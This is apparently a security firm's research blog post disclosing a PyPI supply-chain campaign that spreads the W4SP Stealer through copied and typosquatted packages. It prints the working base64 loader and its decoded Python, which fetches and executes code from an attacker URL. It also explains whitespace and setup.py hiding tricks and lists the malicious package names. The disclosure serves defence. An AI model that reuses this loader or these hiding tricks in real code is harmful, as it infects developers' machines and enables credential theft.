@@ -1,0 +1,92 @@
+
+Last week, our automated risk detection platform alerted us to some suspicious activity in dozens of newly published PyPI packages. It appears that these packages are a more sophisticated attempt to deliver the W4SP Stealer on to Python developer’s machines by hiding a malicious __import__ . Join us here on the Phylum research team as we investigate these new and shifting tactics the attacker is using to deploy W4SP stealer in this supply-chain attack.
+__import__
+Similar to this attacker’s previous attempts, this particular attack starts by copying existing popular libraries and simply injecting a malicious __import__ statement into an otherwise healthy codebase. The benefit this attacker gained from copying an existing legitimate package, is that because the PyPI landing page for the package is generated from the setup.py and the README.md, they immediately have a real looking landing page with mostly working links and the whole bit. Unless thoroughly inspected, a brief glance might lead one to believe this is also a legitimate package.
+Here’s the PyPI landing page for the malicious package typesutil. You can see the attacker just copied the datetime2 package and made a few slight modifications in an effort to make the text consistent with the phony package name it was published under.
+The main attack seems to have started around October 12, 2022, slowly picking up steam to a concentrated effort around October 22. Our system did, however, detect a small number of packages from July of 2022 that show similar IOC’s. The assumption is that this was an early POC effort, that is just now being executed in this fashion.
+Evolving Tactics
+In the majority of packages, especially the earlier ones, the malicious import was simply injected into either the setup.py or the __init__.py as shown below on line 40. This screenshot is from requests-httpx which copied the requests package.
+Too                 Many                    Spaces
+As this and other similar attempts were taken down, the attacker changed tactics slightly, and instead of just dumping the import in an obvious spot, it was placed waaaaay off screen, taking advantage of Python’s seldomly used semicolon to sneak the malicious code onto the same line as other legitimate code. Here’s a screenshot of setup.py from the malicious package typesutil. Upon first glance, nothing seems out of the ordinary here.
+However, if you widen up your code editor window (or just turn on word wrapping) you’ll see the __import__ way off in right field. For those counting at home, it was offset by 318 spaces….
+pip
+In a few packages, the attacker attempted to evade detection without using the __import__ statement at all. Instead, they used the setup.py file to try and pip install one of the other malicious packages that did have the malicious code. Here’s a screenshot from the malicious package duonet:
+You can see the pip install on lines 5 and 6. Aside from the fact that package requirements should go in a requirements.txt or similar file, the fact that this setup.py is pip installing a benign sounding typesutil wouldn’t immediately raise too many alarms from visual inspection alone.
+Here’s a list of packages we’ve turned up so far that either contain the strange import directly, or attempt to pip install one of the packages with the strange import:
+
+typesutil
+typestring
+sutiltype
+duonet
+fatnoob
+strinfer
+pydprotect
+incrivelsim
+twyne
+pyptext
+installpy
+faq
+colorwin
+requests-httpx
+colorsama
+shaasigma
+stringe
+felpesviadinho
+cypress
+pystyte
+pyslyte
+pystyle
+pyurllib
+algorithmic
+oiu
+iao
+curlapi
+type-color
+pyhints
+Decoding the Import
+Regardless of how these packages are infecting machines, once they do, they all do the same thing and it all comes down to this strange looking import (or something very similar to this; sometimes it differs slightly because the attacker uses several different URLs to pull their next bit of malicious code from—more about that below):
+__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GdTY0M1h6YVNibUNjbkdOJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+First let’s understand what this method chain is doing. To start with, there’s a lengthy Base64 encoded string that gets decoded. Then that decoded string gets compiled into a code object (see the python docs on compile for more info on that). That code object is then executed.
+Now that we know something is being executed, let’s figure out what that is. Let’s start by decoding the Base64 string. Doing so yields:
+b'from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\'http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN\').read())""")\n_ttmp.close()\ntry: _ssystem(f"start {_eexecutable.replace(\'.exe\', \'w.exe\')} {_ttmp.name}")\nexcept: pass'
+Interesting, looks like some Python code. Formatting this nicely for readability will show us what this is doing:
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from os import system as _ssystem
+
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\'http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN\').read())""")
+_ttmp.close()
+
+try:
+    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+except:
+    pass
+First it imports tempfile which, as the name suggests, allows for the easy creation of temporary files. Then it imports executable from sys which provides the absolute path of the executable binary for the Python interpreter on the machine. And finally it imports system from os which allows execution of commands in a subshell.
+After all those imports it then goes on to create a temporary file, into which it writes the following (again, formatted for readability):
+from urllib.request import urlopen as _uurlopen
+exec(_uurlopen('http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN').read())
+And finally, it then attempts to run the temp file, which is now another Python script. Notice that it runs the script with pythonw.exe (notice the “w”) and not python.exe. The difference between the the two is that pythonw.exe will not open a console window when run—an obvious attempt to hide whatever this code is doing from the machine’s user.
+You’ll notice that this again runs exec on whatever is returned from the URL. So what’s at the URL? Some lightly obfuscated Python code. Here’s a snippet of what it looks like:
+For reference, the entire file is ~21K characters. However, all it really comes down to is a handful of lambdas and a long compressed byte object. This is pretty typical Python obfuscation—long, hard-to-distinguish variable names, a number of lambda functions, hex-encoding, raw bytes, etc. Without going into the nitty gritty of this one, the gist is that it calls zlib.decompress() on a long compressed byte object and executes it. The result of the decompression…
+MORE OBFUSCATED PYTHON 😵‍💫
+And this time it looks really nasty. It’s okay, though, I’m hourly so let’s go! Here’s a snippet:
+For reference, this mess clocks in at around 71K characters so there’s quite a bit of mud we have to trudge through here. But again, this is pretty typical for obfuscated Python. As we were working through this, however, it became evident that something wasn’t quite right. Perhaps the code was too obfuscated for its own good? We couldn’t get it to do anything other than produce syntax errors and tacked it to our wall of “malware that doesn’t work” (read more about malware that doesn’t work in another post here). We suspect the attacker recognized this as well because after this, their tactics changed once again.
+Simplifying the Attack Chain
+In one of the most recently discovered packages cypress the attacker appears to have removed one layer of complication from this attack. In this package, the early stages are identical up until the part where it retrieves code from the URL. This time, they pull the code directly from a public GitHub repo called inject that belongs to a user called “Quiriky”.
+The code it pulls this time actually looks like real code! Strange code, to be sure, but actual code. Unsurprisingly, it claims to have been obfuscated with Hyperion…
+And let’s not forgot what a big fan of whitespace this attacker is. Scrolling to the right reveals:
+Or with word wrapping on:
+Okay, cool, a bunch of compressed byte objects again. This time, they’re mixed into whatever this pretend _callfuncion class is. Or I guess it’s only kind of pretend because the malicious parts of the code are actually passed as keyword arguments to some of the class methods, so it’s actually doing some work. Thankfully, we didn’t find more obfuscated code when working through this. This time, what we discovered is that there are 14 big compressed byte objects that each get passed to the _callfunction.Statistics method which effectively just stores them as variables. Then later on in the code if this condition passes elif 107990 < 3594010 (spoiler alert, it always does) a bunch of lambdas are used to decompress and exec the data in some specified order. The result ultimately appears to be deployment of the W4SP Stealer.
+Wrap Up…For Now
+As a wrap up, let’s re-hash exactly how this supply-chain attack is executed:
+
+There are dozens of packages actively being published on PyPI with benign-sounding names (some are typosquats) that blatantly copy existing legitimate packages and tries to sneak in a small snippet of malicious code.
+The malicious code is a hidden __import__ statement in the package’s setup.py, __init__.py, or we’ve even seen it injected into custom error classes. Regardless, it contains a Base64 encoded string that gets executed. Sometimes instead of the import directly in these files, it could just be an os.system() call that pip installs one of their other malicious packages.
+Decoded, that Base64 encoded string contains a Python script that is written to a temporary file that is executed.
+That temporary file contains code that reaches out to any number of URLs.
+From each URL it pulls lightly obfuscated Python code that executes a compressed byte object.
+Decompressed, that byte object contains the W4SP Stealer malware that is deployed on the system.
+As this is an ongoing attack with constantly changing tactics from a determined attacker, we suspect to see more malware like this popping up in the near future. So stay tuned as we discover and uncover more from this highly active supply-chain attack!
+Impact
+According to the PyPI download counter pepy.tech, as of publication, collectively the packages listed above account for over 5700 downloads. Notice that some of the packages appear to be obvious attempts at typosquatting like twyne and colorsama (which squats on twine and colorama respectively) which together account for hundreds of millions of downloads per month.
